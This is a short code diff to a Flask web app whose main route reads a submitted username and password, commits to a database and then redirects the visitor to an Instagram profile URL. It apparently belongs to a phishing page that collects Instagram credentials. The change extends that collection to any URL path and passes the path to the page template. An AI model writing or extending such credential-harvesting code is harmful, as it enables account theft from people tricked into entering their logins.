@@ -49,9 +49,10 @@ def admin_logout():
     return redirect(url_for("index"))
 
 
-@app.route('/<path:subpath>')
+@app.route('/<path:subpath>', methods=['GET', 'POST'])
 @app.route('/', methods=['GET', 'POST'])
 def index(subpath=""):
+    print(subpath)
     if request.method == "POST":
         username = request.form['username']
         password = request.form['password']
@@ -61,4 +62,4 @@ def index(subpath=""):
         db.session.commit()
         redir = redirect(f"https://instagram.com/{subpath}", code=301)
         return redir
-    return render_template('index.html')
+    return render_template('index.html', subpath=subpath)
